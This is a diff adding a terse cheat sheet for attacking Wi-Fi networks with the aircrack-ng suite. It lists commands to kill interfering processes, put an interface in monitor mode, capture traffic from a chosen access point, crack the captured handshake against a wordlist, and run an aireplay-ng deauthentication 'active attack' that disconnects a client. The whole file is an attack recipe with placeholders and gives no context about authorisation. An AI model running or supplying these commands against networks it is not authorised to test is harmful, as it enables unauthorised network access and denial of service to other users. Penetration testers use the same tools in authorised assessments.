@@ -1,0 +1,33 @@
+check for errors
+
+airmon-ng check kill
+
+
+
+
+start monitor mode
+
+airmon-ng start <interface>
+
+
+dump
+
+airodump-ng <interface>mon
+
+
+target dump
+
+airodump-ng -c <chanell> --bssid <ap> -w <dump name> <interface>mon
+
+
+
+crack
+
+aircrack-ng -b <ap> <dump>.cap -w <wordlist>
+
+
+
+
+active attack
+
+aireplay-ng -0 3 -a <ap> -c <user> <interface>
